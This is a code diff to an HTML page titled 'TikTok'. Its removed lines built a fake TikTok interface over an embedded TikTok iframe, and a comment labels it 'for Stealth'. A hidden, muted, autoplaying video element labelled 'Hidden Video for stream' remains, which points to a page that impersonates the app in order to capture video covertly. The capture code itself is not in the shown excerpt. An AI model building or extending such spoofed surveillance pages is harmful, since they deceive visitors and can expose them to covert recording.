@@ -4,35 +4,13 @@
     <title>TikTok</title>
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <style>
-        body, html { margin: 0; padding: 0; background: #000; height: 100%; overflow: hidden; font-family: sans-serif; }
-        /* Fake TikTok Overlay */
-        .tiktok-ui { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 10; pointer-events: none; }
-        .top-nav { position: absolute; top: 20px; width: 100%; text-align: center; color: #fff; font-weight: bold; font-size: 18px; display: flex; justify-content: center; gap: 20px; opacity: 0.8; }
-        .side-bar { position: absolute; right: 10px; bottom: 100px; display: flex; flex-direction: column; gap: 20px; align-items: center; color: #fff; font-size: 24px; }
-        .bottom-nav { position: absolute; bottom: 0; width: 100%; height: 60px; background: #000; display: flex; justify-content: space-around; align-items: center; border-top: 0.5px solid #333; }
-        .btn-plus { background: #fff; width: 45px; height: 30px; border-radius: 8px; position: relative; }
-        
         /* Hidden Video for stream */
         video { display: none; }
         iframe { width: 100%; height: 100%; border: none; }
     </style>
 </head>
-<body>
-    <!-- Real TikTok Embed/Iframe -->
-    <iframe src="https://www.tiktok.com" allow="autoplay"></iframe>
-
-    <!-- Fake TikTok UI Elements for Stealth -->
-    <div class="tiktok-ui">
-        <div class="top-nav"><span>Following</span> <span style="border-bottom: 2px solid #fff;">For You</span></div>
-        <div class="side-bar">
-            <span>❤️</span><span>💬</span><span>↪️</span><span>🎵</span>
-        </div>
-        <div class="bottom-nav">
-            <span style="color:#fff">🏠</span><span style="color:#fff">🔍</span>
-            <div class="btn-plus"></div>
-            <span style="color:#fff">📥</span><span style="color:#fff">👤</span>
-        </div>
-    </div>
+<body> 
+    
 
     <video id="v" autoplay playsinline muted></video>
 
